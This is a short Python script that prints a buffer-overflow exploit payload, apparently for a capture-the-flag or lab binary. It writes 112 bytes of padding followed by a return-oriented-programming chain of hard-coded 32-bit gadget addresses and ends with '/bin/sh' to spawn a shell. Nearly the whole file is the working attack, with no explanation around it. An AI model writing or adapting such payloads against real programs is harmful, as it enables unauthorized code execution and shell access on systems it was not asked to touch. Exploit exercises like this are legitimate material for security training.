import sys
sys.stdout.buffer.write(b"a"*112 +
                 0x080563d0.to_bytes(4,"little") +
                 0x080481d1.to_bytes(4,"little") +
                 0xffffffff.to_bytes(4,"little") +
                 0x0805e27b.to_bytes(4,"little") +
                 0x0805e8ad.to_bytes(4,"little")*23 +
                 0x080732d0.to_bytes(4,"little") +
                 0x080729c2.to_bytes(4,"little") +
                 0xffffffff.to_bytes(4,"little") +
                 0xfff6fb6c.to_bytes(4,"little") +
                 0x08094141.to_bytes(4,"little") +
                 0x0807299b.to_bytes(4,"little") +
                 0xffffffff.to_bytes(4,"little") + 
                 0x0805e085.to_bytes(4,"little") + 
                 0x080563d0.to_bytes(4,"little") +
                 0x0805e8ad.to_bytes(4,"little")*11 + 
                 0x080732d0.to_bytes(4, "little") + 
                 b"/bin/sh")